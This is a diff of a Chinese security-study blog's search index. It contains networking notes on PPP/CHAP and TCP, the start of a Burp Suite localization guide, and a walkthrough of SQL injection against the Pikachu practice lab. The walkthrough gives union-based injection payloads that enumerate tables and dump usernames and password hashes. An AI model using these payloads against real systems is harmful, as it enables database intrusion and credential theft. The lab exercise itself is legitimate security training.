-ppp pap sent-username ruijie2 password 0 ruijie2</code></pre>
-
-
-
+</li>
+<li><p>TCP头部字段</p>
 <ul>
-<li>接口状态信息验证</li>
+<li>端口号：源端口标识发送方的进程,目的端口表示接收方的进程</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162351.png" alt="10" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">R1#show interface serial 1&#x2F;0
-Index(dec):35 (hex):23
-Serial 1&#x2F;0 is UP , line protocol is UP
-Hardware is Serial
-Interface address is: 1.1.1.1&#x2F;24
-MTU 1500 bytes, BW 2000 Kbit
-Encapsulation protocol is PPP, loopback not set
-Keepalive interval is 10 sec ,retries 10.
-Carrier delay is 2 sec
-Rxload is 1&#x2F;255, Txload is 1&#x2F;255
-LCP Open
-Queueing strategy: FIFO
-Output queue 0&#x2F;40, 0 drops;
-Input queue 0&#x2F;75, 0 drops
-5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-38021 packets input, 5656110 bytes, 0 no buffer, 0 dropped
-Received 23488 broadcasts, 0 runts, 0 giants
-0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
-38097packets output, 2135697bytes, 0 underruns , 0 dropped</code></pre>
-
-<pre class="language-none"><code class="language-none">R1#show interface serial 2&#x2F;0
-Index(dec):35 (hex):23
-Serial 2&#x2F;0 is UP , line protocol is UP
-Hardware is Serial
-Interface address is: 1.1.1.2&#x2F;24
-MTU 1500 bytes, BW 2000 Kbit
-Encapsulation protocol is PPP, loopback not set
-Keepalive interval is 10 sec ,retries 10.
-Carrier delay is 2 sec
-Rxload is 1&#x2F;255, Txload is 1&#x2F;255
-LCP Open
-Queueing strategy: FIFO
-Output queue 0&#x2F;40, 0 drops;
-Input queue 0&#x2F;75, 0 drops
-5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-38325 packets input, 5655320 bytes, 0 no buffer, 0 dropped
-Received 23358 broadcasts, 0 runts, 0 giants
-0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
-38235packets output, 2135895bytes, 0 underruns , 0 dropped</code></pre>
-
-<h3 id="PPP典型配置案例（CHAP单向认证）"><a href="#PPP典型配置案例（CHAP单向认证）" class="headerlink" title="PPP典型配置案例（CHAP单向认证）"></a>PPP典型配置案例（CHAP单向认证）</h3><ul>
-<li>ppp authentication chap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162356.png" alt="11" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">interface Serial1&#x2F;0
-ip address 1.1.1.1 255.255.255.0
-encapsulation ppp
-ppp chap hostname ruijie1
-ppp chap password 0 ruijie1</code></pre>
-
-<pre class="language-none"><code class="language-none">username ruijie1 password 0 ruijie1
-interface Serial2&#x2F;0
-encapsulation ppp
-ip address 1.1.1.2 255.255.255.0
-ppp authentication chap</code></pre>
-
-
-
-
-
+</li>
+<li><p>序列号:保证数据传输的有序性,确认收到的数据进行确认</p>
 <ul>
-<li>接口状态信息验证</li>
+<li>窗口大小:传输阶段每次连续发送数据的大小</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162401.png" alt="12" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">R1#show interface serial 1&#x2F;0
-Index(dec):35 (hex):23
-Serial 1&#x2F;0 is UP , line protocol is UP
-Hardware is Serial
-Interface address is: 1.1.1.1&#x2F;24
-MTU 1500 bytes, BW 2000 Kbit
-Encapsulation protocol is PPP, loopback not set
-Keepalive interval is 10 sec ,retries 10.
-Carrier delay is 2 sec
-Rxload is 1&#x2F;255, Txload is 1&#x2F;255
-LCP Open
-Queueing strategy: FIFO
-Output queue 0&#x2F;40, 0 drops;
-Input queue 0&#x2F;75, 0 drops
-5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-38021 packets input, 5656110 bytes, 0 no buffer, 0 dropped
-Received 23488 broadcasts, 0 runts, 0 giants
-0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
-38097packets output, 2135697bytes, 0 underruns , 0 dropped</code></pre>
-
-<pre class="language-none"><code class="language-none">R1#show interface serial 2&#x2F;0
-Index(dec):35 (hex):23
-Serial 2&#x2F;0 is UP , line protocol is UP
-Hardware is Serial
-Interface address is: 1.1.1.2&#x2F;24
-MTU 1500 bytes, BW 2000 Kbit
-Encapsulation protocol is PPP, loopback not set
-Keepalive interval is 10 sec ,retries 10.
-Carrier delay is 2 sec
-Rxload is 1&#x2F;255, Txload is 1&#x2F;255
-LCP Open
-Queueing strategy: FIFO
-Output queue 0&#x2F;40, 0 drops;
-Input queue 0&#x2F;75, 0 drops
-5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-38325 packets input, 5655320 bytes, 0 no buffer, 0 dropped
-Received 23358 broadcasts, 0 runts, 0 giants
-0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
-38235packets output, 2135895bytes, 0 underruns , 0 dropped</code></pre>
-
-<h3 id="PPP典型配置案例（CHAP双向认证）"><a href="#PPP典型配置案例（CHAP双向认证）" class="headerlink" title="PPP典型配置案例（CHAP双向认证）"></a>PPP典型配置案例（CHAP双向认证）</h3><ul>
-<li>ppp authentication chap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162408.png" alt="13" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">username ruijie2 password 0 ruijie2
-interface Serial1&#x2F;0
-ip address 1.1.1.1 255.255.255.0
-encapsulation ppp
-ppp authentication chap
-ppp chap hostname ruijie1
-ppp chap password 0 ruijie1</code></pre>
-
-
-
-<pre class="language-none"><code class="language-none">username ruijie1 password 0 ruijie1
-interface Serial2&#x2F;0
-ip address 1.1.1.2 255.255.255.0
-encapsulation ppp
-ppp authentication chap
-ppp chap hostname ruijie2
-ppp chap password 0 ruijie2</code></pre>
-
+</li>
+<li><p>Flag字段:</p>
 <ul>
-<li>接口状态信息验证</li>
+<li>ACK:确认标志号,置于1表示确认号有效,表示收到虽短的特定数据<ul>
+<li>RST:复位标志.至于1表示拒绝错误和非法的数据包,复位错误的链接</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162411.png" alt="14" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">R1#show interface serial 1&#x2F;0
-Index(dec):35 (hex):23
-Serial 1&#x2F;0 is UP , line protocol is UP
-Hardware is Serial
-Interface address is: 1.1.1.1&#x2F;24
-MTU 1500 bytes, BW 2000 Kbit
-Encapsulation protocol is PPP, loopback not set
-Keepalive interval is 10 sec ,retries 10.
-Carrier delay is 2 sec
-Rxload is 1&#x2F;255, Txload is 1&#x2F;255
-LCP Open
-Queueing strategy: FIFO
-Output queue 0&#x2F;40, 0 drops;
-Input queue 0&#x2F;75, 0 drops
-5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-38021 packets input, 5656110 bytes, 0 no buffer, 0 dropped
-Received 23488 broadcasts, 0 runts, 0 giants
-0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
-38097packets output, 2135697bytes, 0 underruns , 0 dropped</code></pre>
-
-<pre class="language-none"><code class="language-none">R1#show interface serial 2&#x2F;0
-Index(dec):35 (hex):23
-Serial 2&#x2F;0 is UP , line protocol is UP
-Hardware is Serial
-Interface address is: 1.1.1.2&#x2F;24
-MTU 1500 bytes, BW 2000 Kbit
-Encapsulation protocol is PPP, loopback not set
-Keepalive interval is 10 sec ,retries 10.
-Carrier delay is 2 sec
-Rxload is 1&#x2F;255, Txload is 1&#x2F;255
-LCP Open
-Queueing strategy: FIFO
-Output queue 0&#x2F;40, 0 drops;
-Input queue 0&#x2F;75, 0 drops
-5 minutes input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-5 minutes output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec
-38325 packets input, 5655320 bytes, 0 no buffer, 0 dropped
-Received 23358 broadcasts, 0 runts, 0 giants
-0 input errors, 0 CRC, 0 frame, 0 overrun, 0 abort
-38235packets output, 2135895bytes, 0 underruns , 0 dropped</code></pre>
+</li>
+<li>SYN:同步标志序号,至于1表示同步需要,用来建立连接<ul>
+<li>FIN:结束标志,至于1表示链接将被断开,用于拆除链接</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114921.png" alt="3" loading="lazy"></p>
+<h3 id="TCP协议工作过程"><a href="#TCP协议工作过程" class="headerlink" title="TCP协议工作过程"></a>TCP协议工作过程</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>数据传输之前：三次握手建立连接</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114923.png" alt="4" loading="lazy"></p>
+<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p> 数据传输过程中，发送方发送窗口大小的数据，接收方只进行一次确认</p>
+<p> 如果接收方处理能力不足，会调整窗口大小，接收方按新的窗口进行数据发送</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114925.png" alt="5" loading="lazy"></p>
+<h4 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h4><p> 当某个包因网络问题，传输失败，接收方仅确认上一个数据包 </p>
+<p>发送方将根据确认号，进行数据重传</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114927.png" alt="6" loading="lazy"></p>
+<h4 id="拆除连接"><a href="#拆除连接" class="headerlink" title="拆除连接"></a>拆除连接</h4><p>四次挥手拆除连接， TCP通过FIN置位为1表示拆除连接</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114929.png" alt="7" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -3508,6 +3215,125 @@ Received 23358 broadcasts, 0 runts, 0 giants
       </categories>
       <tags>
         <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu--SQL注入(一)</title>
+    <url>/posts/22ddbd5a/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
+</blockquote>
+<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
+<li>寻找SQL注入位置</li>
+<li>判断服务器类型和后台数据类型</li>
+<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
+</ol>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
+<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
+
+<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
+<p>查询数据库名称</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
+<p>查询user下所有表名</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
+<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
+<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
+或
+?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
+<p>也可以直接在url中的name参数后进行修改</p>
+<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
+<p>查询出所有账户数据</p>
+<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
+<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
+<hr>
+<p>参考链接： </p>
+<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
+<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
       </tags>
   </entry>
   <entry>
@@ -3727,125 +3553,6 @@ Received 23358 broadcasts, 0 runts, 0 giants
 <p>解决办法:</p>
 <p>切换PHP版本\刷新网页</p>
 <p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu--SQL注入(一)</title>
-    <url>/posts/22ddbd5a/</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
-</blockquote>
-<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
-<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
-<li>寻找SQL注入位置</li>
-<li>判断服务器类型和后台数据类型</li>
-<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
-</ol>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
-<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
-
-<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
-<p>查询数据库名称</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
-<p>查询user下所有表名</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
-<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
-<p>对应账号和MD5加密的密码：</p>
-<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
-<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
-<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
-<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
-<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
-或
-?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
-<p>也可以直接在url中的name参数后进行修改</p>
-<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
-<p>查询出所有账户数据</p>
-<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
-<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
-<hr>
-<p>参考链接： </p>
-<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
-<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -4208,6 +3915,68 @@ Received 23358 broadcasts, 0 runts, 0 giants
       </categories>
       <tags>
         <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Suite汉化教程</title>
+    <url>/posts/d334592a/</url>
+    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载所需安装包</p>
+<p>Burp Suite官网：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a></p>
+<p>java环境（推荐下载11.0.1）：<a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p>
+<p>汉化补丁（百度网盘含Java环境）：<a href="https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo">https://pan.baidu.com/s/1m_7QAVbN9QCvQV9xMh3avg?pwd=2yfo</a> 	</p>
+<p>提取码：2yfo</p>
